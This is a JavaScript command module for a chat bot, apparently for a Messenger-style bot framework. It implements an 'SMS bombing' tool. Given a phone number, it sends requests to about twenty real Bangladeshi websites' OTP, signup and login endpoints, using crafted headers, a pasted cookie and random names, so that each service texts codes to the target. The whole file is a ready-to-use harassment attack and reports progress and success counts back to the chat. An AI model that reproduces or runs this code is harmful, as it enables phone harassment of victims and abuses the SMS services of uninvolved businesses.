const axios = require('axios');
const fs = require('fs');
const path = require('path');

module.exports.config = {
	name: "bomb",
	version: "1.0.0",
	hasPermssion: 2,
	credits: "𝑨𝒔𝒊𝒇 𝑴𝒂𝒉𝒎𝒖𝒅",
	description: "Advanced SMS bombing tool",
	category: "system",
	usages: "[phone] [amount]",
	cooldowns: 10,
	dependencies: {
		"axios": ""
	},
	envConfig: {
		"PROTECTED_NUMBERS": ["1912345678", "1812345678"] // Add protected numbers here
	}
};

module.exports.onStart = async function({ api, event, args }) {
	const { threadID, messageID } = event;
	const [phone, amountInput] = args;
	
	if (!phone || !amountInput) {
		return api.sendMessage("⚠️ | Usage: bomb [phone] [amount]", threadID, messageID);
	}
	
	if (module.exports.config.envConfig.PROTECTED_NUMBERS.includes(phone)) {
		return api.sendMessage("🚫 | This number is protected!", threadID, messageID);
	}
	
	const amount = Math.min(parseInt(amountInput) || 10, 20);
	
	try {
		api.sendMessage(`🚀 Starting SMS bombing on: ${phone}\n💣 Amount: ${amount}`, threadID, messageID);
		
		const urls = [
			`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0${phone}`,
			`https://www.bioscopelive.com/en/login/send-otp?phone=880${phone}`,
			"https://www.bioscopelive.com/en/login?type=login",
			"https://fundesh.com.bd/api/auth/generateOTP?service_key=",
			"https://fundesh.com.bd/api/auth/resendOTP",
			"https://api.redx.com.bd/v1/user/signup",
			`https://api.bongo-solutions.com/auth/api/login/send-otp?phone=880${phone}`,
			`https://www.rokomari.com/resend-verification-code?email_phone=880${phone}`,
			`https://www.pizzahutbd.com/customer/sign-in/mobile?phone=0${phone}`,
			"https://admission.ndub.edu.bd/api/users/register-step-1/",
			`https://developer.quizgiri.xyz/api/v2.0/send-otp?phone=0${phone}`,
			"https://api.shikho.com/auth/v2/send/sms",
			"https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
			"https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
			`https://cms.beta.praavahealth.com/api/v2/user/login/?mobile=${phone}`,
			"https://themallbd.com/api/auth/otp_login",
			"https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
			"https://api.wholesalecart.com/v2/user/login-register",
			"https://moveon.com.bd/api/v1/customer/auth/phone/request-otp",
			"https://app.ipay.com.bd/api/v1/signup/v2",
			"https://admission.ndub.edu.bd/api/users/reset/"
		];
		
		const headersList = [
			{"operator": "bd-otp"},
			{"referer": "https://www.bioscopelive.com/en/login"},
			{"Content-Type": "application/json"},
			{"Content-Type": "application/json"},
			{"Content-Type": "application/json"},
			{
				"Accept": "application/json, text/plain, */*",
				"Accept-Encoding": "gzip, deflate, br",
				"Accept-Language": "en-US,en;q=0.5",
				"Connection": "keep-alive",
				"Content-Length": "65",
				"Cookie": "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1",
				"Host": "api.redx.com.bd",
				"Origin": "https://redx.com.bd",
				"Referer": "https://redx.com.bd/registration/",
				"TE": "Trailers",
				"User-Agent": "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0",
				"x-access-token": "Bearer null"
			},
			{"Content-Type": "application/json"},
			{"Content-Type": "application/x-www-form-urlencoded"},
			{"Content-Type": "application/json"},
			{"Content-Type": "application/json"},
			{"Content-Type": "application/json"},
			{"X-Requested-With": "XMLHttpRequest"},
			{"Content-Type": "application/json"},
			{"Content-Type": "application/json"},
			{"Content-Type": "application/json"},
			{"Content-Type": "application/json"},
			{"Content-Type": "application/json"}
		];
		
		const dataList = [
			null,
			null,
			null,
			`{"msisdn":"${phone}"}`,
			`{"msisdn":"${phone}"}`,
			`{"name":"${generateRandomString(4)}","phoneNumber":"${phone}","service":"redx"}`,
			`{"operator":"all","msisdn":"880${phone}"}`,
			null,
			`_token=${generateRandomString(32)}&phone_number=0${phone}`,
			`{"name":"${generateRandomString(5)}","email":"${generateRandomString(7)}@gmail.com","phone":"0${phone}","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}`,
			`{"phone":"0${phone}","country_code":"+880","fcm_token":null}`,
			`{"phone":"+880${phone}","email":null,"auth_type":"login"}`,
			`{"send":"true","phoneNumber":"${phone}","emailConsent":"true","whatsappConsent":"true"}`,
			`{"AccessToken": "","TrackingNo": "","mobileNo": "0${phone}","otpSms": "","product_id": "201","requestChannel": "MOB","trackingStatus": 5}`,
			null,
			`{"phone_number":"+880${phone}"}`,
			`{"name":"${generateRandomString(5)}","mobile_no":"0${phone}","password":"${generateRandomString(16)}","confirm_password":"${generateRandomString(16)}"}`,
			`{"platform":"google","url":"https://www.google.com/","phone":"${phone}"}`,
			`{"accountType":1,"deviceId":"mobile-android-SM-N971N-${generateRandomString(16)}","mobileNumber":"+880${phone}"}`,
			`{"phone": "0${phone}"}`
		];
		
		let successCount = 0;
		let failedCount = 0;
		let progressMessage = "";
		
		for (let i = 0; i < amount; i++) {
			try {
				const url = urls[i];
				const headers = headersList[i] || {};
				const data = dataList[i];
				
				let response;
				if (data) {
					response = await axios.post(url, data, { headers });
				} else {
					response = await axios.get(url, { headers });
				}
				
				if (response.status === 200) {
					successCount++;
					progressMessage += `✅ | Success: ${url.split('/')[2]}\n`;
				} else {
					failedCount++;
					progressMessage += `❌ | Failed: ${url.split('/')[2]}\n`;
				}
				
				// Update progress every 5 requests
				if ((i + 1) % 5 === 0 || i === amount - 1) {
					api.sendMessage(
						`📈 Progress: ${i + 1}/${amount}\n` +
						`✅ Success: ${successCount} | ❌ Failed: ${failedCount}\n` +
						`─────────────────\n` +
						progressMessage,
						threadID
					);
					progressMessage = "";
				}
				
				// Delay between requests
				await new Promise(resolve => setTimeout(resolve, 500));
			} catch (error) {
				failedCount++;
				progressMessage += `🔥 | Error: ${urls[i].split('/')[2]}\n`;
			}
		}
		
		// Final result
		api.sendMessage(
			`🎯 Bombing Completed!\n` +
			`─────────────────\n` +
			`📱 Target: ${phone}\n` +
			`💣 Total Sent: ${amount}\n` +
			`✅ Successful: ${successCount}\n` +
			`❌ Failed: ${failedCount}\n` +
			`⚡ Powered By: 𝑨𝒔𝒊𝒇 𝑴𝒂𝒉𝒎𝒖𝒅`,
			threadID,
			messageID
		);
		
	} catch (error) {
		api.sendMessage(`❌ | Error: ${error.message}`, threadID, messageID);
	}
};

function generateRandomString(length) {
	const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	let result = '';
	for (let i = 0; i < length; i++) {
		result += chars.charAt(Math.floor(Math.random() * chars.length));
	}
	return result;
}
